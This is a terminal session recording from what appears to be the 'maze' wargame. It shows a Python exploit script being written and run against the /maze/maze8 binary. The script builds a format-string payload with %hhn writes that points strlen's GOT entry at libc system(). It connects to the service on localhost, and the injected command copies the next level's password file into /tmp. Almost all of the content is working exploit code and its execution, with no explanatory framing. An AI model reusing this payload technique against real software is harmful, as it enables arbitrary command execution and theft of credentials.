[23.362394, "o", "cat > /run/screen/l8/exp.py <<'PYEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> import socket, subprocess, time, struct, sys\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> GOT_STRLEN = 0x0804b288\r\r\n\u001b[?2004l\r\u001b[?2004h> SYSTEM = 0xf7d6d000 + 0x53ce0        # libc base (ASLR off) + system offset\r\r\n\u001b[?2004l\r\u001b[?2004h> CMD = b\"\\ncat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\\n\"\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> def build_payload(target):\r\r\n\u001b[?2004l\r\u001b[?2004h>     b = [(target >> (8*i)) & 0xff for i in range(4)]\r\r\n\u001b[?2004l\r\u001b[?2004h>     cur = len(CMD)                   # the printed-char total includes the text\r\r\n\u001b[?2004l\r\u001b[?2004h>     seq = []\r\r\n\u001b[?2004l\r\u001b[?2004h>     remaining = list(enumerate(b))\r\r\n\u001b[?2004l\r\u001b[?2004h>     while remaining:\r\r\n\u001b[?2004l\r\u001b[?2004h>         best = min(remaining, key=lambda w: (w[1]-cur) % 256)\r\r\n\u001b[?2004l\r\u001b[?2004h>         seq.append((best[1], GOT_STRLEN+best[0], (best[1]-cur) % 256))\r\r\n\u001b[?2004l\r\u001b[?2004h>         cur = best[1]\r\r\n\u001b[?2004l\r\u001b[?2004h>         remaining.remove(best)\r\r\n\u001b[?2004l\r\u001b[?2004h>     fmt = CMD\r\r\n\u001b[?2004l\r\u001b[?2004h>     offs = []\r\r\n\u001b[?2004l\r\u001b[?2004h>     off = 152                        # pointer slots start here (4-aligned)\r\r\n\u001b[?2004l\r\u001b[?2004h>     for byte, addr, delta in seq:\r\r\n\u001b[?2004l\r\u001b[?2004h>         k = 134 + off // 4           # vararg N for buf offset o: N = 134 + o/4\r\r\n\u001b[?2004l\r\u001b[?2004h>         fmt += (b\"%\" + str(delta).encode() + b\"c\" if delta else b\"%c\")\r\r\n\u001b[?2004l\r\u001b[?2004h>         fmt += b\"%\" + str(k).encode() + b\"$hhn\"\r\r\n\u001b[?2004l\r\u001b[?2004h>         offs.append((off, addr))\r\r\n\u001b[?2004l\r\u001b[?2004h>         off += 4\r\r\n\u001b[?2004l\r\u001b[?2004h>     p = fmt + b\"\\x00\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     for o, addr in offs:\r\r\n\u001b[?2004l\r\u001b[?2004h>         p = p.ljust(o, b\"\\x00\") + struct.pack(\"<I\", addr)\r\r\n\u001b[?2004l\r\u001b[?2004h>     assert len(p) <= 511\r\r\n\u001b[?2004l\r\u001b[?2004h>     return p\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> subprocess.Popen([\"/maze/maze8\", \"31337\"],\r\r\n\u001b[?2004l\r\u001b[?2004h>                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\r\r\n\u001b[?2004l\r\u001b[?2004h> time.sleep(1)\r\r\n\u001b[?2004l\r\u001b[?2004h> s = socket.create_connection((\"127.0.0.1\", 31337), timeout=8)\r\r\n\u001b[?2004l\r\u001b[?2004h> s.recv(100)\r\r\n\u001b[?2004l\r\u001b[?2004h> s.sendall(build_payload(SYSTEM))\r\r\n\u001b[?2004l\r\u001b[?2004h> time.sleep(2)\r\r\n\u001b[?2004l\r\u001b[?2004h> s.close()\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"payload fired; result file:\")\r\r\n\u001b[?2004l\r\u001b[?2004h> PYEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=bbf7eb3e-622b-4235-bf6f-1c72f43ad8df;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze8;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze8\u001b\\\u001b]3008;end=bbf7eb3e-622b-4235-bf6f-1c72f43ad8df;exit=success\u001b\\\u001b]3008;start=5226ee0b-5968-480c-833c-1e642c782207;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze8;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze8\u001b\\\u001b[?2004h\u001b]0;maze8@maze: ~\u0007maze8@maze:~$ "]
[23.546012, "o", "rm -f /tmp/o9; python3 /run/screen/l8/exp.py\r\r\n\u001b[?2004l\r\u001b]3008;start=68328c1d-d12c-4e8b-ba30-eaab3e658fd8;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze8;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze8\u001b\\"]
[23.54664, "o", "rm: cannot remove '/tmp/o9': Operation not permitted\r\r\n"]
[26.6116, "o", "payload fired; result file:\r\r\n"]
[26.635558, "o", "\u001b]3008;end=68328c1d-d12c-4e8b-ba30-eaab3e658fd8;exit=success\u001b\\"]
